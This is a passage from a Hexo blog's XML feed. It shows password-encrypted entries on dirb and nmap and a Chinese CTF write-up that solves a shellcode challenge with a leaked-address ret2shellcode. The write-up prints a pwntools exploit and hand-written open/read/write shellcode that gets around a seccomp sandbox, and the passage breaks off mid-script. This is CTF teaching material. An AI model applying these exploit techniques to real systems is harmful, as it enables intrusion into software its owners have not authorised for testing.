0c8826f7deb1ee816be21180f9a4b1d4becf80d853199e9dc4f38f37d936937637920d801119518c73748754b9186b6fd97e414f06c2662dd87673e405075957be5b61a8ac462784f8f5dd9b2e3faf53a058b85d3347a12e1d2dc9230921945777bb6ec7ca80e0238bb9ce28237dd9e9c848bc8d63f35bf429475fcdf78ac98ea9333cc98452aef77bc2bd6064d614fcb9f945c02451a7ea2d4c4f4b8597c7a125796cd21a9937b5c7c71e5efc530f6d71e3bcbc23fdb0befdba19fc84051d3577bea81152c40e49b77dfec6add8d4040d2f5e605d3c76da2741025f133a39efbdda21bbe525114921c0f45de77c2167bbf80b3e184bbc938eed8e1679fe49cf3e8bedd67bf606c716a866deeb2af047ec2a0c92c79365cd440bd96698bd4a46b67833d5e0c2d648c2f26c43b04304cd1954cc279185e9461459f85a2b9ece4832171ee1e8bfa5ed8c05e8b6565d93774186ec8d9c92f32b115d226cddad93e7b3f8e57944631a310d062227f1c382595e38658882829c1a403bb8ed9d144eeb587a3bf874406a5e8250d7298764e4d4267508456f1fd2ecfad878774bcc0b3ab3f5f32efad0cded0aa183ce1938144b9b6aba0b5e4745db4479abd9c44c5e0aa20f3a6e144adbee846d516c3c9e6644239978cf85246672a7d3199fdd257a807367cda6036c0da3d2f6898f89f72436186ef26aa158d92268bc48522123025a9aaed488ab6f65fd95f6e656b4867c790fac9dc310d85f14b8df3b49065d93d8a4dd470ca878b1d11764ef275bc2e089f0479b16b17e8385b11deabc6bb606deb9cf8eabaad084ed3fa1869901240a12b0bda43812462d33546ebb5d70a7319e639ced61f52537f381fab21ba89de1d88f4de40bf0f7a65ce0b148f374898506748b342f654cb1fe7262ee2981291ef0fd759f9425f71700d92ca958aa681c227470ebd249e3eb2c61a951b5e2362189730b5286316e7bb37f004bf7a915354638717398682aefc8844d55033cc74fb72364d6099c5a9fd40b106f2c70df413c4c9caf00b4f07f4b34d97a1e342a7232c638344b6ed72299e63558d19c63d9f3c409b1b7aae7b5bbb62dcb1fe05101cb5c6b7e323492545999617e9891165df8f80b2e6766d323fbd42159bfa6318a04b732e474300f3dc24a719e007bc5dd16000b3efadca0a55b05ea49d192b5b864fbdb4763e2e148111dd4bde6738a1171dd773a45920add8cf25dc2c49607a3455594edf1d78f4ac441f1bfc0a5cd32d7e275cf6ac1a243c2d947e2c194cce263558f732aa75ea62ca24766aeedde53d1cc48fa7a0e1d8c2b926cdee3cbb7e7ecfba82e4945089e5784cf8a4ddf7c2ae7797b98287947cbd0707a7b5df47b397d5b04f0cad25a0bfe55591a3b75e70aa9b0831b55471fb68437cecfb262e699c1167926ca523c4103d326a1e5dd073b035b8420d2c7392422f646f0f039e94ac39cbfea96066e2ca18628b3c4169c7318f0dfefef0aaf3cf79dd800665778d2f2bc1fdc7a06fb95aeaa0a6663d88b1ab20d8747ed00efba88b6264969b0861f239a10d2c834a84d1dd531b1a440276d8a960013d70437179f0108b49c53c4696537261d54ba7cce3f2154adbf26f01bd6dd206540fa5761af7cb26c8f696aa6522e514e43391e296909ade5e21947b5a6e5ee95b4c54eb634db3500bac09a2029c9dfd7049bff67f18125998bed085e962a67e3723c115166416fd7823c6eb74060af3c1512c5635a6a1f0a4d64253ea965a61463a18e0eda927694b028527b42e483c3d6a823282aa42d9f3bfd123c06207b69c5edc9050af1d9643c63cda917db9e6cadb499d8af5adfd6fe3bf3420cd776c596e9d8e6be3f82461018e1865422a43dd50524812548a6ad4a565fb08ce6049158aa2301b21d11e7d5a6aa26b7343e9bf8c20571cc66a5cd3333aeee482ed1abd87cad7759381b36f2a359590485471652712ffda96044715f7bd0f30a7871d26d5683291667f52dad746d8e681c32ab639da0d2113b4765353aff1220bce73dc213014a589d85384339947d9823139a9ac6cb77ee291b5d6dbbc114b7c7f0fd54e3f5dea9a6992b594c8db8c2a61ba36dcec7795b9037a8b8b61d0fbaf44d990a00348d48f6f4f4fd7add8ff7dbae71bfd3f3e1112e536022099265d5f8c2221401f57dae9e6193c748b1d1357c16de6d67bd7a69d3747564ed3254d9c8f200bf66b2435f452a827d6ba709a81a0d49a359dacb6b6b012c483d944de6c8d58b895a4e5411966d32d3021b366374f1a6b88297285191b3824c0f2e524c82fde426531d4e9807c3d550fc8871b7a8dac753b397cae33842d8d58a3e85500a7d68048e9ee428fd8a28539a9f277767ce53865a</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>dirb使用指南</title>
    <url>/posts/fa6b0987/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="e2fd4eade3ec11075af0c6ce53e60209a609760696a45c0428f7983a37652dc0">76291f8277a192d05ae4529da013122ba6d62fe59623cbd41be255061c7938a9e870cf625461b2152d0761a4e8f314db5048e59dbc3e2545d0d50176b294d3690982f76e627bce2abe944d5e535fb89a2cfe8166e66767d6f4c7add14b9370f9e01bcf8a7a60c4e5665cdc2121b79fb9c6ffdf4d4428617dd2c301028d1fe8381e90933a9429d1263be748df1bfae49591e12106a81e493113257079fe55d58d4b7e15933009a464efe8a62f4d91d946831296330e404a6a6bcc6f213a9723c877aa9fd813f14690bc067171253d4ccdd72447b8376ef88272197f15b4538a04a92c37c674383f6c8365d5ca56bd105ab8c63b0c5b5e48de9bbf246def093faf7da2a87b588d1ba2760b20cb1e09f2e051a2c57083d48db96de496276a55fa3fadcfda9654ff3ad1b67ace4a1bb60d1eca8cd78958f43c45b8cc3b8f7b725c5f0463138716c079dc52832c04b6b677d9b5bdbd78f9118695b6cd1cb1c7752161881239301eb833279f5700b627b09ae1fcecd5b999c92737ff9c324b3726d3dea306d1dd15b631d1c0a27a93d8920f7394c6842f98f1859cbb424beb57a6c902c39931a0cdf8c143799266662e771850b4e99ed225aef4d6adf901e7045cf2b621d624af0fa3549cc46567184482cd4714474235e05388d976ed7ec897ffa4f0998fadcab0634876f192ac4811de82c28a21c341e89a3bd4b0a71ccc02822adc8247ab8fbcbec15f302ebfda3981f305639109b0aa08cc041e8cfb525fa44e13285d44d889340f784c1d9a77571d319eecdc648e13f636c06e9545b936be59929e9591862551e9297fa27404535009eeaecdea4d018ce286b927abd13778c523e6f681c5a45043e3e14c0e3e73ec7f3536d8ba57acd37c669e3eb2e4b0edcb4a705cb6e2587d213f1a07203adae618748cd15417464efd2ea1d5e5ce955a539ae76a7079621b286a0065544309266a847be74a8dbe3630291bf3dc8d2164475d8eb2bcd899efb63fec9bc46289bb8ef8a118d7af4b0c00b0e2fec49a216c9d4643a09f95733576a26e23346dc5cc6db42d29310c551dbdb551e23459db03d4884e709bc51d66cde3ff86e9578700bd0194b4da287ef609c17ff58f4ff7245c0d3f2fcda875dd62d17b9cf889d4c4045b959855b1d9f3324031f0beb5264d0699dad101d0314de9d2d0580e0d8f238c05ef5cc41d06c4d0449d6114d22f7497857d1036b61c27f99f31db6392fd66c58e1d8d2dbd04eceb47b5bfe4ddf11f0ddc1b9c5b7b4bd74cce37b7299ce1e9c3ec207609e97816fccf5d9a7065f20abac8862e7092fc224dfc50ffe532e801b9efe7422abc6cad0704b6efd2d113814542d1724ab0aff5c92c5a93d48ea9144b0069f89c765ee23cee57d3a38325d9f24344a022a0bd88618f4cb478140bf983ac3590439fc8214657ee400e2f216021685383313da63781125eeb96c55349329b69f05839b1e51fead6adecf42c727bae5289f6bdac591883bec72556c177b38eebb3c46a419a6e310aeb1c8bea58819b7db037f1a06f7d2b7007e808674c63211f4cc3e46e93505d271b6c7b87a2263e9b114646c1369b7b13a1331f8c904733ff8f99c2572a992f0c9f5d765c836671a3f1399073cfcb05016e9463b0f1470741dc07a81aabfc9d344cf1ef8cf1e3857a2615d43f16c8958b11e2031df38fdad78125968013a1403d11cac87554129e2f83093e43336febdb541d189308954901ce3eab4726f5a9b6e89cede40d35d17769943fe616a55deac098606ddd01e2f7e7291d78d6a687f6ae568f93815feec57070e346d826c0b1b83727c05f6af20a910287081194520b8176e64bb1b44f5aa90becf263f09c684827eb1c5493087dac286f4288278c76b88c71d140cf263a9a716724fa75637be0ad84301c640f9737e86614f5f2c69310453eca4fa077de1ba32ea863b1b836b318e0dfdb050331a5bc7f0c79d7b4b9a781df55d4e4e0f5efeb23760a087abbc167b41af24e95ac8b10323235b8d69789b33cd5b337ca2df5828ea29d61683b7341234abc80dc33fde0dc7164f8a146eeba24d1af0c9878754011a4cc1f1d88313b100139ecc20755e16a829b7fb6c43df0b43401bd223fc39096b0acdd0e85f6afb5fe19bce9519123f619238d49c0202dd9d4e91dedec899068defb97f20ceb34ec160de30af8c1ce5629f66859e247582c445e483641c76a0f9a120f85a4b377989965ae16da8888eaabe1b244f3e0f47aaa249d769c95aa0fde0544690454d8ef0b056ee37e0318f06f7bcc1fc20e33434013c6de96abab8fc2b5b4d721a8f9babba2c7681d4304f60e4d546e4305a7257c81f2ed24e688e329c3b9ec550c99b0d98d870861ced84e9969c771543c4d08ef54a3205715959d265b971b1ac23487e443d36b3f66375924e78fd03e57c0ec00c684bba2e7da4835925432a547f699732481269e3678195a5a36f60bf301cba6ca76d9dd6c1963c8ab147606aadda09545140077201e61228a1756cf31eeaa09b828f0990e952e26fa2d19e18ed3ea0116853dd1b21bec8fa10eb545f72401d5c6d6deca7560d582da9d9922c6e549da70541fff17b093c2423ce578df73a123921f529d5cf182681f150aef3baecaad58d4664c6fd42a457632e29fbb73073f6c26739c0d2f21d92b149dc031914319bac93a168a49908a5807b9c4718f554c9b11a6e2e58dd389e355847e62a35619d0799de630327f77339f99bfe0a153b0f26c40e8fe265514f93c7262b00b7f723b2aa333ea0418d0501d0f978a1652de628177affdf4b8105c1ec15bfef1bd8b0914424b849a99d40c6d7206339c1f3d8ff8fce838fb6bcda2888a23f07a951f6011421572008158e3ec4b480b11b62f28f74821add31b75e8aa1085f34700c56fc0c36abf908a10b01336ebbfbe817b87f36c67f43f323f85b790550d59bf6ed413bfad15ca2f5a44d0805416cd3fdf5119801d1a5708ec52166bf58d422232957236ff3db5960ccb7f6ede5e5e1f9134a61b8f72d7bd2ebef668b437b52d6ba0cffa</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>web</category>
        <category>工具篇</category>
        <category>目录扫描</category>
      </categories>
  </entry>
  <entry>
    <title>nmap使用指南</title>
    <url>/posts/4a2cdcee/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="ff8bd604a563963a67a53c6869783ea490cba81a2c62207624c2cb4e092a12ab">de88e4f7ca87df5c0f87a4310c29c4b4c7a3debba2619dceba9c27d6b68dca47faabadd10ea79b4cbd1dec096d4cd51b9c26a21fc77dd00cd2d9780125f0281064dd79cbf9211c107fc0f67526fbda3b1d3cdce68068c78f1aa3794894a43efdf02b31961471bdb2ca479e2062105a19117084c84ac7018852f41cbd0f9ce5fc5a5766e02d09394569552e031b30db40c15cf021f1e454372abd8a5a357a1f10bf53eca902f94fb767324382f3179b07cfffc20446b519e6462fd444bf05f5eb64cb1464bacd7512f1733ab72601140da31753b6bbcd700044f84a875fcd9551dafb5596ae40df7df5eb9a390f8b3e1b85605d0a4062a55f6a9228ea110a47896494a43329df767b2b93f38e757a4e9184839aa1662fd5c6008920356c80afca1ac4c292a3fbd84bd1cae973f3c37df2e9fdc8c050bb226e16dce6525441d23df18f5378c99ae5601fbbe9fe5407e07d41f61ee9067688f5c71de8cc4072919749c821cf6f747f143f6af5fee05dee9336c7f1f779748fc09fc292d6cc71ff9514414eb41b9ab1551f18f2c4078e0228a4ee41b2fe4d459e0553d352e2589a6af17a353c74d4ae30bbe73880cd2dd9714bd3f83a3a5786577096c284b6897827497218df902da1ece0994de8227692725c905208efca6a5db93bce8d110c5a278e05b2a08e6095b15e27c6249f2344802fb0698d8be6ddd435e910b80795c06036f35f94b14054973e650c3c4341cc0b947039dc0653a080b019f96a73156e5698af978482ff36f99338d9d0d0300108f0ceb3fa4371eaabafe8ad1e715a603ac3ee05ad3d115916f095a56592aed31a0e4a44813be01ff2e8ac2aa356987f480925e47fdee20537b73efa985a25625edd0deeaf0939b5b9d677d69f550094d8f5dfef2439e6ad92188079d67534f9e38034d29b2d4196110d240b9a5cc6e3350023e23cb7eb6ceb91f93595b87744367d2003a86b09f7cd69d1d2a49063149a727f723a6c0ab400b18e9a1fee9d467a0296acf0989dfdebd57266060b4dc99d9c6621d3f82669f2fb94b201365f7973a7619c56840ccc55c51a7e002007d55daf680c7dbba7844e13768417ccb96d9306cf966e56d544d21549c75f078d10df14843e1a181b98bd24ee6d9647bb5371c822f8bef73fd162c7f61313d810c7628e90974658a565c2776b521378367955ccd7e725d3c3729c9a3b52dfb7df5f17d65d79f28c3b476f26b34177d82874fc102562188d1ab79b5cf4a1d7a2fc1ec538b8c7c886da45be7615f141ff2b5181cb711e84518d04786de7c24a5489784f11b331f93458d084f73b3bd8d8f1cfb223836f498ea5fed47c57629f2b189d810a08f5b617c0397ad56477bfcc992f4afdb054475d6feb4054f375fd246f602793e2f31aeda16e39c01045976ee7dd54773cd69063a5a6a21452b5d05cff20a459e003bc1f1d05a045d10d345f4c3413aaf3faad992ccd1aa7368978aa98c92f934837b22031b8aed4861f7ab043b2e664967ef794c7541707e8df540521bd2750d86268b8a52fe9f8445553562b71645a1f865865831fa358e9aa220eb84627c4a65f726e4fe9bf039626e2e33e54774289af2fe3947a6c5878ad7ecfb54ff17355b011a1e295e254c35b2786d67ceb383af8b600e205e240743b97bdefa21363831386f05b4f3a36e5a96fa137a3b3ade463e4b4d5a5938b45f5794ca9d15e94162a86d55720aa7785ce34e92153a47b7e6dd747b7fa679fd4f03154cf703b64a43bf9c456f2188949cd90ef1e379be65bd24b244696e0118dbb711be35639fb57e6c193acf9b3235a1b383baf486048b8b33cec388c321b2ed3d147b510b5e4ade5d4a31b2d1e9fe9a6d28f81f5e060ad22f2583449ee1fa2b1d73fdab35cd37ee64f6000cda140a166f6771c8f8a4a43c5ca28f98fef3ec8294908a8e58e5f9e41f0d2507b10487a96ed3dadd7b3c63f75889f4230b7de081d01c904e29e4f6f79c526e824df65b87d009702f1c85ef922c58b306f588b4265b48753aa64b50beae2a5b55ebf7205c8ce270ad0eb096498a19c19c45431be80107e4de5ec7d97469c96d528f090543a9f1260cbb0269456fd70029883474396a16f322dc1420a2a6d647d60cd18b1b159c4dda6c32e99308b11e2ad16cc641833efc3cfd866efce469194b5ad37249f7e1939c02e17c8f54c770ea02b50f22a807dc58f87e7611a5db5c3be9a608f3568a7e9f0eb6aef6b9b58dbea93d2b30335cec601d09e27a4a306dcaa52c6f7f4f28638b69718755e448741de67e039ae4a1f8588b7990ebc036c7dfffde7eb90048ecaa1739ed35c2fddfa58f51d34fd9e456a64d60cc58e87bd64b6e86f15fc9676426fd825a27bf0f27184430e8bd50602ea3d15375e999163586c3433e2a7dfdae4285b72d5901877636c9376ec06d21433e4fa1a999ec907b1fe7a6d9d1982458c425e70f597eae4a36615285a169b46858b9b843d0129f415ef187b2ff8c9ced5079731af85a63ff3b3f03073eb7d25a0b7888deb7b5df15d6f99673056595c643a0c724cfcc26b17046ab5c7047857605014010a45f8d1a952090d58a23720629a489ef231fef9e5fbd951b0a9b33db30b012912d598d1712eeabda07fe13ec66cea2ac215b89ea15f852b0eac2f263e1e8857aa9e0cb5ee72435f22120ab65bbbaf4e9821d9d9e0faa31a64be4c3340eaf637c25b2e5f3633a4136d3fbd7daacb86231f1374eb8bfa5d639b85695d94633678d29880d1aeeadc762863b7a5cfa6b1f9c81a063a7034a3208f2ed70ea587d25c3bd39f0fc28eea19a84bcb0d1ee63c9539d1f7534c53b99870bec9cc041078479b52438d823950dbff4e29213084745f7b55f10726c470ba8e267865b0de4c4fd42cffb21fd4ec2890d62db3e58a00a63ce0e8cc28b80d585de10a424e32d5</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>web</category>
        <category>工具篇</category>
        <category>端口以及存活扫描</category>
      </categories>
  </entry>
  <entry>
    <title>记一道shellcode的点</title>
    <url>/posts/b9a2d7db/</url>
    <content><![CDATA[<h1 id="记一道shellcode的点"><a href="#记一道shellcode的点" class="headerlink" title="记一道shellcode的点"></a>记一道shellcode的点</h1><p>题目看着很简单，就一个执行shellcode的，emm，我考虑了很久，怎么rop的，构造了各种骚操作rop，发觉那个限制输入长度太短了。。。所以还是回到这里mmap申请的空间开了权限7，rwx,所以想办法写shellcode,这样的话地址是个问题，这个问题纠结了很久我都没看出点，吃个饭回来懂了，他这里读入的时候有栈溢出，虽然没溢出到ebp，不过溢出到了dest指针，所以我输入0x78大小的数据的话，可以泄露地址<br>emm，现在很简单了，ret2shellcode就完了</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>注意这里开了沙盒保护：只能用read,write,open，也就是orw，经典的题目，<br>其实字节不限制我觉得可以ROP的，用万能gadget是一样可以构造orw的</p><h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"game start "</span>);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)mmap(<span class="number">0L</span>L, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( dest == (<span class="keyword">char</span> *)<span class="number">-1L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"mmap fail"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sec_rule();</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, &amp;buf, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> pwn(dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">pwn</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Maybe you can do something"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>就是泄露地址，ret2shellcode，这里shellcode有点小问题，我自己写的有00截断，看了下pwntools生成的,照着改下就过了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./SEC'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data                                    : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data                              : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data                                    : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data                              : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>                               : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span>                         : io.recvuntil(delim, drop)</span><br><span class="line">rg   = <span class="keyword">lambda</span> regex                                   : io.recvregex(regex)</span><br><span class="line">rp   = <span class="keyword">lambda</span> timeout=<span class="number">1</span>                               : io.recvrepeat(timeout)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data                                    : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data                                    : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr                                  : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_one_gadget</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line"><span class="comment">#one_gadget = one_gadget(libc.path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">    shellcode = asm(<span class="string">'''mov rax, 0x101010101010101</span></span><br><span class="line"><span class="string">                    push rax</span></span><br><span class="line"><span class="string">                    mov rax, 0x101010101010101 ^ 0x67616c662f2e</span></span><br><span class="line"><span class="string">                    xor [rsp],rax</span></span><br><span class="line"><span class="string">                    mov rdi,rsp</span></span><br><span class="line"><span class="string">                    xor edx, edx</span></span><br><span class="line"><span class="string">                    xor esi,esi</span></span><br><span class="line"><span class="string">                    push 2</span></span><br><span class="line"><span class="string">                    pop rax</span></span><br><span class="line"><span class="string">                    syscall</span></span><br><span class="line"><span class="string">                    mov rdi,rax</span></span><br><span class="line"><span class="string">                    xor eax,eax</span></span><br><span class="line"><span class="string">                    push 0x64</span></span><br><span class="line"><span class="string">                    pop rdx</span></span><br><span class="line"><span class="string">                    mov rsi,rsp</span></span><br><span class="line"><span class="string">                    syscall</span></span><br><span class="line"><span class="string">                    push 1</span></span><br><span class="line"><span class="string">                    pop rdi</span></span><br><span class="line"><span class="string">                    mov rsi,rsp</span></span><br><span class="line"><span class="string">                    push 1</span></span><br><span class="line"><span class="string">                    pop rax</span></span><br><span class="line"><span class="string">                    syscall</span></span><br><span class="line"><span class="string">                        '''</span>)</span><br><span class="line">    shellcode = shellcode.ljust(<span class="number">0x78</span>,<span class="string">"A"</span>)</span><br><span class="line">    print(shellcode)</span><br><span class="line">    print(len(shellcode))</span><br><span class="line">    sl(shellcode)</span><br><span class="line">    addr = uu64(r()[<span class="number">-7</span>:]) &amp; <span class="number">0x7fffffffff00</span> + <span class="number">0xa</span></span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    sl(<span class="string">"a"</span>*<span class="number">0x18</span> + p64(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    sl("cat *flag*")</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        flag = rp(1)</span></span><br><span class="line"><span class="string">        import re</span></span><br><span class="line"><span class="string">        flag = re.findall("flag&#123;.*?&#125;", flag)[0]</span></span><br><span class="line"><span class="string">        print("flag is: " + flag)</span></span><br><span class="line"><span class="string">    except Exception as e:</span></span><br><span class="line"><span class="string">        print(e)</span></span><br><span class="line"><span class="string">    '''</span></span><br></pre></td></tr></table></figure><p>简单版shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./SEC'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data                                    : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data                              : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data                                    : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data                              : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>                               : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span>                         : io.recvuntil(delim, drop)</span><br><span class="line">rg   = <span class="keyword">lambda</span> regex                                   : io.recvregex(regex)</span><br><span class="line">rp   = <span class="keyword">lambda</span> timeout=<span class="number">1</span>                               : io.recvrepeat(timeout)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data                                    : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data                                    : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr                                  : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print 